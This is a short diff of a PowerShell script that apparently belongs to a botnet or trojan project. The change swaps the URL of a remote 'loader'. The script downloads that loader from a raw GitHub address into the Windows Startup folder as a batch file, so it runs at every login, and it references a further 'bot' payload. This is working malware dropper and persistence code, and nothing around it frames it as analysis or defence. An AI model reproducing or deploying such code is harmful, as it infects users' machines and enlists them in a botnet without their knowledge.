@@ -5,7 +5,7 @@ $startUpFolder = "$userprof\AppData\Roaming\Microsoft\Windows\Start Menu\Program
 $botnetCode = 'Add-Type -AssemblyName System.IO.Compression.FileSystem'; #Always Useful
 
 $wc = [System.Net.WebClient]::new();
-$loader = "https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/loader";
+$loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
 $wc.DownloadFile("$loader","$startUpFolder\loader.bat");
 
 $bot = "https://raw.githubusercontent.com/cyruschiira/bhptrojan/main/bot";
